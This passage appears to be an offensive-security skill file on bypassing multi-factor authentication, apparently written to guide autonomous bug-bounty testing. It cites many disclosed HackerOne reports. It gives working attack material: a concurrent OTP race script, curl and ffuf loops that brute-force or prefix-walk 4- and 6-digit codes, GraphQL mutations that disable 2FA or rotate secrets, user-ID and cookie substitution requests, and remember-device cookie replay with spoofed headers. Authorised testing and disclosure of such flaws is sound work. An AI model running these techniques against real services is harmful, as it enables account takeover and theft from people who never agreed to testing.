# HackerOne #587910: valid backup code + random password on disable mutation
POST /graphql
{"query":"mutation { disableTwoFactor(password:\"wrong\", backupCode:\"VALID\") { ok } }"}
```

### Identity-parameter substitution
```http
# Snapchat #921780 — swap user_id on logout then login with the returned token
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
{"user_id":"VICTIM_ID","device_id":"...","device_name":"..."}
# -> {"status":"SUCCESS","user_id":"VICTIM_ID","token":"TOKEN",...}
POST /scauth/otp/login  (username=victim, token=TOKEN)

# GitLab #128085 — add login header/param to the OTP submit
POST /users/sign_in
Content-Disposition: form-data; name="user[otp_attempt]"
212421
Content-Disposition: form-data; name="login"
john   (victim)

# CS Money #1179232 — swap steamid cookie on confirm
POST /login/confirm
Cookie: steamid=<victim_steam_id>;
{"token":"foo","code":"foo"}
```

### Race condition (OTP used more than once)
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_PRE_MFA_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # ~30 simultaneous submissions of the SAME OTP; two are NOT enough
        results = await asyncio.gather(
            *[verify(s, "123456") for _ in range(30)])
        # Confirmed if >1 success among many "already-used" responses
        for status, body in results:
            print(status, body)

asyncio.run(race())
```

### Prefix-oracle walk (stay in ONE session)
```bash
# Submit partial codes in the request BODY, not the URL query
for p in 0 1 2 3 4 5 6 7 8 9; do
  curl -s -X POST -H "Content-Type: application/json" \
    -b "session=SESSION" \
    -d "{\"otp\":\"$p\"}" https://target.com/api/verify-otp
done
# Keep the prefix whose response DIFFERS; append 0-9 and repeat.
# Never re-login between guesses — it regenerates the OTP.
```

### OTP replay / expiration
```
1. Complete valid MFA with OTP "123456".
2. Logout; login again; submit "123456"  -> accepted?  (#2529780, #695041, #67660)
3. Generate 3 OTPs over 90 seconds; submit the FIRST -> accepted? (#2529780)
4. Submit a code >1 minute old -> accepted? (#2588810)
5. Reuse a confirmation token on /sign_up/enter_password -> works? (GSA #264090)
```

### Detection oracle cheatsheet
```
400 Invalid  ->  200/204 accepted       (Bitwarden #979820, Grab #202425)
one response of unique length (373) = correct code  (Evernote #1394984)
error message contains the session/OTP code = leak  (H1 #142221)
gauth_secret / backup_codes in response body = disclosure  (#1276373, #100509)
no 429 after 20 wrong attempts = no rate limit  (#121696, #128777, #979820)
```

### Grep patterns for source / JS review
```bash
grep -rEi "(otp|totp|2fa|mfa|backup_code|recovery_code|gauth_secret)" --include="*.js" --include="*.py" --include="*.graphql"
grep -rE "status\s*[:=]\s*false|success\s*[:=]\s*false" --include="*.js"   # client-side gate
grep -rE "user_id|otp_user_id|steamid" --include="*.js" --include="*.py"   # identity in MFA flow
grep -rE "(backup_codes|gauth_secret)" --include="*.json" --include="*.js" # secret exposure
```

### Enrollment / verification brute force
```bash
# Email verification code during 2FA setup (Evernote #1394984 — 6 digits, length oracle)
ffuf -u "https://target.com/api/verify-email" -X POST \
  -H "Content-Type: application/json" \
  -d '{"confirmationCode":"FUZZ"}' \
  -w <(seq -w 000000 999999) -fs 373 -t 5
# The correct code returns a unique response length (373 bytes in the report).

# 4-digit registration/verification code (HackerOne #64666)
seq -w 0000 9999 | while read c; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $c\n" \
    -X POST -d "code=$c" https://target.com/register/verify
done
```

### Disable / secret-rotation with wrong credentials
```http
# HackerOne #587910 — valid backup code + garbage password disables 2FA
POST /graphql HTTP/1.1
Host: target.com
X-Auth-Token: SESSION_TOKEN

{"query":"mutation disable2FA($backup:String!,$pw:String!){disableTwoFactor(backupCode:$backup,password:$pw){success}}",
 "variables":{"backup":"VALID_BACKUP_CODE","pw":"definitely_wrong"}}

# HackerOne #1139535 — rotate secret + backup codes using an attacker-known setup key
POST /graphql
{"query":"mutation{update2FA(secret:\"ATTACKER_BASE32\", regenerateBackupCodes:true){ok}}"}
```

### Secret / backup-code harvesting endpoints
```bash
# Algolia #1276373 — response leaks gauth_secret
curl -s -b "session=SESSION" https://target.com/api/me | jq '.gauth_secret, .backup_codes'

# HackerOne #100509 — pre-generated codes readable from the DOM before activation
curl -s -b "session=SESSION" https://target.com/settings/authentication/edit \
  | grep -Ei "secret|backup|recovery|otp"

# Error-message oracle that returns the real session code (H1 #142221)
curl -s -X POST -d 'otp=000000' https://target.com/api/verify-order | grep -Ei "session|code|otp"
```

### JWT / "MFA satisfied" claim tampering
```bash
# If the post-MFA state is a JWT claim, decode and look for a forgeable flag
# (alg:none, weak HMAC secret, or a client-supplied claim copied into the token)
jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "<JWT>"
# Look for: mfa_verified, two_factor, amr, acr, factor, otp, step_up
# Then test: can you set the claim true yourself (none alg / leaked secret)?
```

### Device-trust / remember-device replay
```bash
# Superhuman #665722 — take the remember-device cookie from device A,
# replay it from a new IP and User-Agent
curl -s -b "remember_device=COOKIE_FROM_A" \
  -H "X-Forwarded-For: 203.0.113.9" \
  -H "User-Agent: DifferentBrowser/1.0" \
  https://target.com/dashboard
# If MFA is skipped, device trust is not bound to context.
```

---

## Common Root Causes

1. **Client-side-only validation.** The OTP is checked in JavaScript or the response boolean is trusted by the UI, while the server never re-verifies. Response manipulation flips `false→true` (DoD #2962527, UPchieve #1406471, H1 #1943252).

2. **No rate limiting / no lockout on the OTP verify.** A 4–6 digit code becomes a deterministic brute-force target, and failures generate no alert (Grab #202425, Slack #121696, Bitwarden #979820, Algolia #128777, Evernote #1394984, MTN #761000).

3. **MFA state treated as immutable data trusted from the client.** Secret keys, backup codes, and the "MFA satisfied" flag can be modified by the user (MAID) — disable 2FA with a wrong password, rotate the secret without the OTP (HackerOne #1139535, #587910, Omise #1465277, Zivver #992450).

4. **Missing server-side enforcement on sensitive endpoints.** MFA is enforced in the UI or on one route, but password change, email change, account deletion, internal transfers, or admin endpoints accept the request with only a session cookie (Coinbase #10554, Mozilla #2197244, CFP Time #474963).

5. **Workflow / state-machine gaps.** The password step and the MFA step are separate states; skipping the MFA route, deactivating the account, transferring a report, or invoking an embedded form lands the user in a post-MFA state without passing the challenge (Snapchat #921780, HackerOne #2463279, #418767, #2569993).

6. **Client-supplied identity in the MFA flow.** `user_id`, `otp_user_id`, `login`, `steamid`, or org ID is taken from the request and used to bind or verify the second factor, allowing cross-account binding (Helium #810880, GitLab #128085, CS Money #1179232, LY Corp #1250474).

7. **Non-expiring / non-invalidated codes.** OTPs, activation codes, and confirmation tokens remain valid across uses, logout, password changes, and time windows (HackerOne #2529780, Shopify #695041, GSA #264090, WordPress #67660).

8. **Stale sessions.** Enabling MFA, logging out, or resetting the password does not invalidate existing sessions or "remember device" trust (CS Money #1185479, HackerOne #2469706, Superhuman #665722/#667739, Moneybird #743518).

9. **Alternate authentication paths.** SSO/social sign-in, embedded forms, and secondary clients bypass or silently disable 2FA (Shopify #178293, Cloudflare #1593404, HackerOne #418767, Grab #202425).

10. **Enrollment without identity proof.** 2FA can be attached to an unverified email or arbitrary phone number, either locking out the real owner or routing the OTP to the attacker (Moneybird #649533, Omise #699200, XVIDEOS #3016540, HackerOne #2501984).

11. **Secrets exposed to the client.** `gauth_secret`, backup codes, or the OTP itself are returned in a response, DOM, or error message (Algolia #1276373, HackerOne #100509, H1 CTF #2635315, H1 #142221).

12. **Business-logic gates enforced inconsistently.** A "2FA required" policy is checked on report submission but not on bounty claim, invite, or transfer (HackerOne #2571981, #2528919, #2575079, #2486086).

13. **CSRF on MFA configuration.** Adding a secondary 2FA number or disabling 2FA lacks a CSRF token (Slack #155774, Mail.ru #670329, VK #90165).

14. **Misconfiguration / broken 2FA UX.** Deprecated QR libraries, wrong TOTP encoding, missing issuer, or non-functional recovery codes prevent users from securing accounts or cause acceptance bugs (HackerOne #2463069, Legal Robot #260390/#260491/#251200/#249337, HackerOne #2588810).

15. **No notification or audit trail for MFA changes.** Enabling/disabling 2FA, adding a phone, or resetting the factor generates no email or log entry, so the victim cannot detect the attack and the researcher cannot be sure the change is observable (Nextcloud #1200989, HackerOne #149598).

16. **Prefix / incremental comparison instead of constant-time full compare.** The validator checks the code digit-by-digit and leaks correctness through response differences, reducing a 10^6 space to a linear walk. This is a distinct root cause from "no rate limit" and is often the only exploitable path when rate limiting exists.

17. **Factor destination mutable without re-authentication.** A phone number or email can be changed with just a session — and the OTP is not required to authorize the change — so the recovery OTP is routed to the attacker (HackerOne #2501984, #2588329, Superhuman #667740, Slack #155774).

18. **The "2FA required" policy is enforced at the UI layer only.** The setting changes which button is shown, not which endpoints accept requests; any API client can ignore it (HackerOne #2571981, #2528919, #2575079, #2486086).

19. **Password reset and 2FA are independent flags.** Resetting the password does not re-challenge 2FA, and deactivating an account clears the 2FA flag; the two states are not conflated correctly (HackerOne #2463279, #2543342, Nextcloud #486693).

20. **Acceptance-window misconfiguration.** TOTP codes far older than the standard 30-second step are accepted, turning one observed code into a long-lived credential (HackerOne #2588810, GSA #264090 non-expiring confirmation tokens).

### Root-cause → technique mapping

| Root cause | Fastest confirming technique | Representative reports |
|------------|------------------------------|------------------------|
| Client-side validation | Flip response boolean | #2962527, #1406471, #1943252 |
| No rate limit | 20 wrong codes, then full/prefix sweep | #202425, #979820, #128777 |
| MAID | Wrong password + valid backup code | #587910, #1139535, #1465277 |
| Identity in flow | Substitute user ID / cookie | #921780, #810880, #1179232, #128085 |
| State machine gap | Direct post-MFA navigation / deactivate | #2463279, #418767, #2569993 |
| Non-expiring code | Replay across windows/logout | #2529780, #695041, #264090, #67660 |
| Stale session | Replay old cookie after enable/logout | #1185479, #2469706, #665722 |
| Secret exposure | Read response/DOM for `gauth_secret` | #1276373, #100509, #142221 |
| SSO alternate path | Sign in with Google/Apple | #178293, #1593404, #722748 |

---

## Bypass Techniques

### Workflow / state-skip bypasses
- Direct navigation to `/dashboard`, `/api/me`, or `/settings` with the pre-MFA cookie.
- Substitute `user_id` / `otp_user_id` / `login` on the OTP submit or logout endpoint.
- Deactivate the account, then reset the password — 2FA flag cleared (HackerOne #2463279, #2543342).
- Transfer a report / claim a bounty / accept an invite via a route that omits the 2FA-required check (HackerOne #2569993, #2528919, #2575079).
- Sign in through Google/Apple/SSO so 2FA is bypassed or silently disabled (Shopify #178293, Cloudflare #1593404).

### Validation-oracle & brute-force bypasses
- Full 10^6 or 10^4 sweep when there is no rate limit and a clear success discriminator.
- Prefix-by-prefix validation oracle — collapse the key space to ≤60 requests; never re-login mid-sweep.
- Response length/timing/status diff as the oracle (Evernote #1394984 unique length; Grab #202425 400 vs 204).
- Lack of code expiration — use an OTP well outside its 30-second window (HackerOne #2588810, #2529780).

### Client-side control bypasses
- Flip `success`/`status` booleans in the intercepted response (DoD #2962527, H1 #1406471).
- Change HTTP status 401 → 200.
- Call the underlying GraphQL/REST mutation directly with a wrong password but a valid backup code (HackerOne #587910, #1139535).

### Replay & race bypasses
- Reuse an OTP across logout/login, across multiple time windows, or after activation (HackerOne #2529780, Shopify #695041, WordPress #67660).
- Reuse a confirmation token to bypass a lockout (GSA #264090).
- Fire 20–30 concurrent identical OTP submissions via HTTP/2 single-packet / Turbo Intruder to win the TOCTOU window (HackerOne #2598548).
- Reuse old session cookies after logout, password reset, or MFA activation (HackerOne #2469706, CS Money #1185479).

### Trust-boundary & identity bypasses
- Swap `steamid`/session cookie to a victim on the confirm request (CS Money #1179232).
- Bind 2FA to a victim account by supplying their user ID on `/api/2fa` (Helium #810880).
- "Remember this device" cookie from a new IP/User-Agent — device trust not bound to context (Superhuman #665722).
- Add an arbitrary phone number without SMS proof so the recovery OTP goes to the attacker (HackerOne #2501984, #2588329).

### Enrollment / verification bypasses
- Register with an unverified victim email, enable 2FA, lock the victim out (Moneybird #649533, XVIDEOS #3016540, Omise #699200).
- Brute-force the email verification code during 2FA setup (Evernote #1394984).
- Exploit the "without an account" Google Authenticator flow to satisfy a 2FA-required gate (HackerOne #2486086).

### Info-disclosure → bypass
- Read `gauth_secret` or backup codes from a response/DOM (Algolia #1276373, HackerOne #100509).
- Trigger a wrong OTP and read the real session/OTP code from the error message (HackerOne #142221).
- Request a 2FA reset to the victim's email and rely on a "cancel within a day" default that auto-disables 2FA (HackerOne #2492631).

### Deactivation / reset bypasses
- Deactivate the account, reset the password via email access, then log in — the 2FA flag is gone (HackerOne #2463279, #2543342).
- Reset the password while a 2FA-enabled session is pending; the pending MFA login is not expired (Moneybird #743518).
- Reuse a confirmation token after the account-lock window to change the password and bypass the lockout (GSA #264090).

### Backup-code / recovery bypasses
- Reuse backup codes after regeneration, or predict the next batch from a known setup key (HackerOne #1139535, #100509).
- Brute-force short backup codes (6–8 digits) where the space is small and no lockout exists.
- Change the recovery destination (phone/email) without proving the old factor, so the attacker receives the recovery OTP (HackerOne #2501984, #2588329).

### Multistep / chained bypasses
- Cookie theft + password oracle + no step-up on password change = persistent ATO without ever solving an OTP.
- Info disclosure (`gauth_secret`) + a valid session = attacker generates valid TOTP codes at will (Algolia #1276373).
- CSRF on 2FA-number add + OTP request to the attacker's number = second factor redirected to the attacker (Slack #155774).
- SSO alternate path + 2FA silently disabled + normal password login = full admin access without a code (Shopify #178293).
- Race on the OTP verify + a single guessed code = ATO without brute force (HackerOne #2598548).

### When one factor fails, switch factors
The corpus repeatedly shows that the *presence* of multiple factors does not mean they are equally protected. If TOTP cannot be bypassed, try SMS (often no rate limit), email (often short codes), backup codes (often exposed), "remember device" (often unbound), or the alternate SSO path. Helium #810880 and Shopify #178293 succeeded precisely because the researcher did not stop at the strongest factor.

---

## Gate 0 Validation

Before writing any report, confirm all three. An MFA bypass claim without these is likely to be N/A'd or downgraded.

1. **What can the attacker DO right now?**
   - Show an attacker-controlled session reaching a genuinely post-MFA state (dashboard data, settings, protected API) without a valid second factor.
   - Or show a protected action completed without the OTP (password changed, 2FA disabled, backup codes read, funds transferred, report submitted).
   - "The OTP response said true" is not enough — demonstrate the resulting access or state change.
   - For brute force: show the response oracle and the successful code, not just "no rate limit exists."
   - For replay: show the same code/cookie accepted twice with timestamps or distinct login sessions.

2. **What does the victim LOSE?**
   - Full ATO (email/password change, lockout of the legitimate owner) → High/Critical.
   - Theft or rotation of the 2FA secret/backup codes → persistent ATO.
   - Protected data disclosure (program details, participant lists, `gauth_secret`) → High.
   - Enrollment lockout (attacker enables 2FA on victim's unverified email) → Medium/High depending on platform impact.
   - If the only loss is "the attacker already had the password and now skips a prompt," place it correctly on the severity scale: standalone MFA bypass with a known password is typically Medium/High; chained with a password oracle or cookie theft it is Critical.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Does the endpoint still respond the same way with a fresh session?
   - Is the success discriminator stable (not a one-time fluke or a cached response)?
   - Can a second person follow the steps and land in the post-MFA state?
   - If the bug depends on a race, confirm >1 success across several 30-request bursts and document the ratio. If it depends on timing windows, verify the window is reliably exploitable.

**Never-submit list (unless chained):** client-side-only boolean flip with no server consequence; "no rate limit" with no demonstrated successful code; stale-session observations with no demonstration of account access; non-security UX issues (lengthy manual secret entry, missing issuer label, wrong email wording) unless they break the security guarantee. These appear frequently in the corpus but are usually closed as informational.

### Severity rubric for MFA bypasses

| Attacker preconditions | Demonstrated outcome | Typical severity | Example |
|------------------------|----------------------|------------------|---------|
| None (no password, no session) | Login as any user by ID substitution | Critical | #921780, #810880 |
| Pre-MFA cookie only | Protected data/actions reachable | Critical/High | Pattern 4, #128085 |
| Email access only | Password reset clears 2FA → ATO | High | #2463279, #2543342 |
| Valid credentials (password known) | OTP brute-forced / skipped → ATO | High/Medium | #202425, #979820, #587910 |
| Existing authenticated session | 2FA disabled / secret rotated | Medium/High | #1139535, #992450 |
| Existing session + cookie theft chain | Full persistent ATO | Critical | #2479622, #665722 |
| Own account only | Policy gate bypass with real impact | Medium/High | #418767, #2571981 |
| Own account only, no downstream impact | Boolean flip / UX defect | Informational | #260390, #249416 |

The decisive question is always **what the attacker gains that they did not have before**. If the answer is only "a different JSON boolean," do not submit. If it is "another user's account, a stripped second factor, or a protected secret," the finding is real.

### Pre-report evidence checklist

- [ ] A request/response pair showing the negative input (wrong code, victim ID, old cookie) producing a positive result.
- [ ] A negative control showing the same request with the correct/safe value.
- [ ] A screenshot or response proving the post-MFA state (dashboard, settings, API data).
- [ ] A clear statement of preconditions (what the attacker must already have).
- [ ] Reproduction steps a second person can follow in ≤10 minutes.
- [ ] For brute force: the exact oracle and the successful code (or the attempt count at the rate-limit threshold).
- [ ] For races: the concurrency level, number of bursts, and success ratio.
- [ ] For replay: timestamps or distinct login sessions demonstrating reuse.

---

## Real Impact Examples

### Scenario A: Unauthenticated cross-account login via OTP workflow substitution (Snapchat #921780 pattern)
An attacker logged into their own account, then called `/scauth/otp/droid/logout` with the **victim's `user_id`**. The endpoint returned `{"status":"SUCCESS",...,"token":"..."}` bound to the victim. The attacker then called `/scauth/otp/login` with the victim's username and that token and was logged in as the victim — no OTP ever entered. Because the OTP state machine trusted a client-supplied identity parameter, the second factor was completely nullified. Critical, CVSS 9.3 (2020).

### Scenario B: Password-only session disables 2FA and changes account state (HackerOne #587910 / #1139535 pattern)
A program required 2FA. The disable-2FA flow asked for "authentication or backup code + password." Supplying a **correct backup code with a random/garbage password** disabled 2FA (HackerOne #587910) — the password was never checked server-side. In a sibling report, the GraphQL mutation let an attacker change the TOTP secret and backup codes without knowing the OTP (#1139535). An attacker with only a session (e.g., an unattended browser) could strip the second factor and take persistent control.

### Scenario C: Business-logic gate bypass with a $10,000 payout (HackerOne #418767 pattern)
HackerOne required 2FA to submit reports to certain programs. The researcher removed 2FA and was blocked on the canonical submission page — but the **embedded submission form** path did not enforce the requirement. Using that alternate route, a non-2FA account could submit to a 2FA-required program, defeating the security policy. Paid $10,000 (207 upvotes). The same class recurs for bounty claims (#2528919), collaborator invites (#2575079), and report transfers (#2569993).

### Scenario D: 4-digit OTP brute force against a mobile API (Grab #202425 pattern)
The endpoint `https://p.grabtaxi.com/api/passenger/v2/profiles/edit` verified an SMS code with no rate limiting and no expiration. A wrong code returned HTTP 400 `{"code":4000}`; a correct one returned 204 No Content. Because the code was only 4 digits, enumerating 1000–9999 yielded the valid code and bypassed 2FA. The root cause — no rate limit + no code expiration — is the single most common pattern in the corpus (55/96 reports).

### Scenario E: Device trust and stale sessions defeat MFA (Superhuman #665722 / CS Money #1185479 pattern)
In one report, the "email" MFA mode let an attacker bypass MFA from the victim's device as long as device trust had not expired ($2,500). In another, enabling 2FA on device A left device B's already-authenticated session active (CS Money #1185479). The second factor protected only the login transition, not the ongoing session — so any stolen or lingering session made it irrelevant.

### Scenario F: Leaked second factor via response disclosure (Algolia #1276373 / HackerOne #100509 pattern)
An attacker with any read-level access to a user object found that the response included `gauth_secret` — the TOTP seed itself. With the seed, the attacker can generate a valid code at any time, so the "second factor" adds no protection against anyone who can read that endpoint. In a related HackerOne case, the settings page DOM exposed the secret and backup codes that *would* be used when 2FA was activated, readable by any script running in the session. Both turn a read-only info disclosure into a full, persistent MFA bypass.

### Scenario G: Second factor stripped by deactivation (HackerOne #2463279 / #2543342 pattern)
An attacker with access to the victim's email deactivated the victim's account, reset the password through the email flow, and logged in — the 2FA requirement had been cleared by the deactivation. The same pattern was independently reported twice in 2024, showing that password-reset and 2FA state were stored as independent flags with no re-challenge between them. Impact: complete ATO from "email access only," which is often achievable via phishing or a prior breach.

### Scenario H: Encryption of funds / irreversible action bypass (Coinbase #10554 pattern)
Coinbase allowed users to require 2FA for all Bitcoin transfers. The setting was enforced on external sends but not on the internal transfer path between wallets under the same account. An attacker with a session could move funds without the second factor, defeating the exact protection the setting promised. The lesson: test **every** action the security setting claims to protect, not just the obvious one.

### Common threads across the scenarios

- The strongest factor is irrelevant if a weaker parallel path exists (SSO, SMS, backup codes, internal transfer, embedded form).
- Identity parameters and session cookies are trusted as MFA state; anything client-controlled in the flow is suspect.
- "No rate limit" is a force multiplier but rarely the whole bug — pair it with a clear oracle and a small key space.
- The most severe findings need no password at all: they take over an account by manipulating an ID or a workflow state.
- Many medium-severity reports become critical only when chained with cookie theft, XSS, or a password oracle — always ask the chain question before scoring.

---

## Disclosed Report Citations

All 30 IDs below are real and verified in the mined study pack and/or `TOPMFA.md`. Format: **Company — title** ([H1 #id](https://hackerone.com/reports/id)) — subclass, technique, year/bounty.

1. **Snapchat — Improper Authentication - any user can login as other user with otp/logout & otp/login** ([H1 #921780](https://hackerone.com/reports/921780)) — OTP workflow bypass / IDOR, `user_id` substitution on logout+login, 2020 / CVSS 9.3 Critical.
2. **Eternal (Zomato) — Claiming the listing of a non-delivery restaurant through OTP manipulation** ([H1 #1330529](https://hackerone.com/reports/1330529)) — OTP manipulation / business logic, auto-claim OTP + owner mapping, 2021 / $3,250.
3. **HackerOne — Password not checked when disabling 2FA** ([H1 #587910](https://hackerone.com/reports/587910)) — MAID / missing password check, valid backup code + random password disables 2FA, 2019 / CVSS 3.4 Low.
4. **Helium — Account takeover via 2FA linking and improper auth at /api/2fa/verify** ([H1 #810880](https://hackerone.com/reports/810880)) — 2FA-linking IDOR, victim user ID + valid code without session, 2020 / $100.
5. **Algolia — Information disclosure -> 2fa bypass -> POST exploitation** ([H1 #1276373](https://hackerone.com/reports/1276373)) — info disclosure, `gauth_secret` leaked in response, 2021 / $0.
6. **CS Money — Able to block users with 2fa from login by just knowing the SteamID** ([H1 #1179232](https://hackerone.com/reports/1179232)) — unvalidated cookie, `steamid` swap + wrong codes causes lockout, 2021 / $300.
7. **XVIDEOS — Enable 2FA without verifying the email** ([H1 #3016540](https://hackerone.com/reports/3016540)) — enrollment/verification bypass, unverified email + 2FA locks victim out, 2025 / $0.
8. **Nextcloud — Two-factor authentication enforcement bypass** ([H1 #1050244](https://hackerone.com/reports/1050244)) — enforcement bypass, cookie/session manipulation of enforced group, 2020 / $750.
9. **HackerOne — Changing the 2FA secret key and backup codes without knowing the 2FA OTP** ([H1 #1139535](https://hackerone.com/reports/1139535)) — MAID, GraphQL mutation with attacker-controlled setup key, 2021 / $0.
10. **Grab — Two-factor authentication bypass on Grab Android App** ([H1 #202425](https://hackerone.com/reports/202425)) — OTP brute force, 4-digit code, no rate limit/expiration, 2017 / $0.
11. **HackerOne — Two factor authentication bypass** ([H1 #2463279](https://hackerone.com/reports/2463279)) — deactivation + password reset clears 2FA, victim email access assumed, 2024 / $0.
12. **Shopify — Misconfiguration in Two Factor Authorisation** ([H1 #178293](https://hackerone.com/reports/178293)) — SSO alternate path, "Sign in with Google" disables 2FA, 2016 / $1,500.
13. **Omise — Signup with any email and enable 2FA without verifying email** ([H1 #699200](https://hackerone.com/reports/699200)) — enrollment/verification bypass, unverified victim email + 2FA, 2019 / $0.
14. **HackerOne — Business Logic error leads to bypass 2FA requirement** ([H1 #2571981](https://hackerone.com/reports/2571981)) — business-logic gate bypass, 2FA-required program with a no-2FA account, 2024 / $0.
15. **Slack — Bypass two-factor authentication** ([H1 #121696](https://hackerone.com/reports/121696)) — OTP brute force, 20 manual wrong codes on password-reset 2FA, 2016 / $0.
16. **HackerOne — 2FA bypass leads to information disclosure about the program and all hackers** ([H1 #2486086](https://hackerone.com/reports/2486086)) — enrollment bypass, Google Authenticator "without account" flow, 2024 / $0.
17. **HackerOne — Reset the 2FA of the user which can lead to Account Takeover** ([H1 #2492631](https://hackerone.com/reports/2492631)) — non-expiring reset request, "cancel within a day" auto-disables 2FA, 2024 / $0.
18. **CS Money — Previously created sessions continue being valid after MFA activation** ([H1 #1185479](https://hackerone.com/reports/1185479)) — stale session, sessions not invalidated after 2FA enable, 2021 / $0.
19. **Evernote — Email Verification Bypass by bruteforcing when setting up 2FA** ([H1 #1394984](https://hackerone.com/reports/1394984)) — verification-code brute force, 6-digit code + length oracle, 2021 / $150.
20. **Bitwarden — Rate limits too low for email 2FA** ([H1 #979820](https://hackerone.com/reports/979820)) — OTP brute force, no rate limit, 400-vs-200 oracle, 2020 / $0.
21. **GSA Bounty — 2FA bypass: confirmation tokens don't expire** ([H1 #264090](https://hackerone.com/reports/264090)) — non-expiring token, confirmation token bypasses lockout, 2017 / $0.
22. **Shopify — The authentication code when activating 2FA can be used again to log in** ([H1 #695041](https://hackerone.com/reports/695041)) — OTP replay, activation code reused as login code, 2019 / $0.
23. **Algolia — No rate-limit in Two factor Authentication leads to bypass using bruteforce** ([H1 #128777](https://hackerone.com/reports/128777)) — OTP brute force, SMS code no rate limit, 2016 / $100.
24. **Coinbase — Bypassing 2FA for BTC transfers** ([H1 #10554](https://hackerone.com/reports/10554)) — missing step-up, internal wallet transfer skips 2FA, 2014 / $1,000.
25. **GitLab — Bypassing password authentication of users that have 2FA enabled** ([H1 #128085](https://hackerone.com/reports/128085)) — identity substitution, `otp_user_id` + `login` param abuse, 2016 / $0.
26. **U.S. Dept Of Defense — 2FA Bypass via Response Manipulation on Login Page** ([H1 #2962527](https://hackerone.com/reports/2962527)) — response manipulation, client-side-only check, 2025 / $0.
27. **HackerOne — Bypass 2FA requirement and reporter blacklist through embedded submission form** ([H1 #418767](https://hackerone.com/reports/418767)) — alternate-workflow gate bypass, embedded submission form, 207 upvotes / $10,000.
28. **HackerOne — Bypassing HackerOne 2FA due to race condition** ([H1 #2598548](https://hackerone.com/reports/2598548)) — race condition / TOCTOU on OTP verification, concurrent submissions, 136 upvotes / $0.
29. **Superhuman (Grammarly) — "email" MFA mode allows bypassing MFA from victim's device when device trust is not expired** ([H1 #665722](https://hackerone.com/reports/665722)) — device-trust escalation, unbound remember-device cookie, 82 upvotes / $2,500.
30. **HackerOne — Improper Authentication - 2FA OTP Reusable** ([H1 #2529780](https://hackerone.com/reports/2529780)) — OTP replay, old Microsoft Authenticator code reused across windows, 2024 / $0.

### What the citation set teaches

- **The same company can receive the same bug repeatedly.** HackerOne itself received #587910 (password not checked), #1139535 (secret/backup rotation), #2529780 (OTP reuse), #2463279 (deactivation bypass), and the #418767/$10,000 gate bypass. If one MFA flow is weak, test all of its sibling flows.
- **The same pattern spans a decade.** Coinbase's 2014 internal-transfer bypass (#10554) and Shopify's 2016 SSO bypass (#178293) are the same idea as HackerOne's 2024 embedded-form bypass (#418767): the second factor is enforced on the main path but not a parallel one.
- **Low bounty does not mean low severity.** Many OTP-replay and stale-session reports paid $0 yet represent real ATO; their value lies in the chain they enable.
- **Enrollment bugs are the cheapest to find.** #649533, #699200, #3016540 and #1618021 need only a signup form and a security settings page — no brute force, no race, no interaction.
- **Bounties cluster around the highest preconditions removed.** The largest payouts (#418767 $10,000, #1330529 $3,250, #665722 $2,500, #178293 $1,500) all removed a gate without needing the victim's password at all.

---

## Related Skills & Chains

- **`hunt-ato`** — MFA bypass is a primitive; ATO is the destination. Chain: cookie theft (XSS/session fixation) + password oracle (login response diff) + no step-up on password change = persistent ATO without ever facing the OTP. (HackerOne #810880, #2479622, Coinbase #10554.)
- **`hunt-auth-bypass`** — MFA-step-skip is auth-flow bypass at the workflow layer. Chain: pre-MFA cookie after password step + direct navigation to `/dashboard` + gate only on `/mfa` = full post-auth access from a password-only state. (Snapchat #921780, GitLab #128085.)
- **`hunt-race-condition`** — OTP replay races live here. Chain: same 6-digit OTP via 20+ HTTP/2 streams (Turbo Intruder single-packet) before the server marks it used → 1 success + 19 "already-used" → ATO with a single guessed code. (HackerOne #2598548.)
- **`hunt-brute-force`** — Rate-limit and lockout testing. Chain: no rate limit + 4-digit code + response oracle = deterministic code recovery. Apply the prefix-oracle and rate-limit-evasion patterns here. (Grab #202425, Bitwarden #979820, Algolia #128777, Evernote #1394984.)
- **`hunt-business-logic`** — "2FA required" gates are business rules; bypass via transfer/invite/claim/embedded routes is a logic flaw. Chain: policy enforced on one workflow, omitted on a parallel one. (HackerOne #418767, #2571981, #2528919, #2575079.)
- **`hunt-idor`** — Identity parameters around MFA (`user_id`, `otp_user_id`, `steamid`) are IDOR sinks. Chain: bind/reset another account's second factor by substituting its ID. (Helium #810880, Snapchat #921780, CS Money #1179232, LY Corp #1250474.)
- **`hunt-info-disclosure`** — Leaked `gauth_secret`, backup codes, or OTP values are second-factor disclosure. Chain: any read-IDOR/XSS that returns `/api/me` or `/settings/authentication/edit` yields the MFA secret. (Algolia #1276373, HackerOne #100509, #142221.)
- **`hunt-csrf`** — 2FA configuration changes without CSRF tokens. Chain: cross-site POST to add an attacker-controlled 2FA number, then request the OTP to that number. (Slack #155774, Mail.ru #670329, VK #90165.)
- **`hunt-mobile`** — Mobile APIs often have weaker OTP rate limits and shorter codes. Chain: mobile endpoint brute force bypasses web-app controls. (Grab #202425, TikTok #1247108/#1747978.)
- **`hunt-misconfiguration`** — SSO/social-login misconfigs silently drop 2FA; broken QR/encoding/issuer settings break the factor or widen acceptance windows. (Shopify #178293, HackerOne #2463069, #2588810.)
- **`security-arsenal`** — Pull the OTP wordlist generator (000000–999999, 1000–9999), Turbo Intruder race templates, ffuf rate-limit-evasion flags (`-t 5`, `-p 0.5-2`), and the JWT-replay table for "MFA satisfied" claims.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical. Standalone MFA bypass with a known password is Medium/High; chained with a password oracle or cookie theft it is Critical. The chain question separates the two.


---

## Merged Source Knowledge

This section consolidates **3 unique knowledge blocks** from 1 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (3 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-mfa-bypass/SKILL.md`

## Autonomous Testing Priority

**Try workflow bypasses before brute force — they're faster and more likely to succeed.**

**Pattern 1 — Skip the MFA step entirely (most automatable):**
1. Login with valid credentials → receive a "pre-MFA" session state
2. Without completing MFA, directly access a protected resource (`/dashboard`, `/api/me`, `/account/profile`)
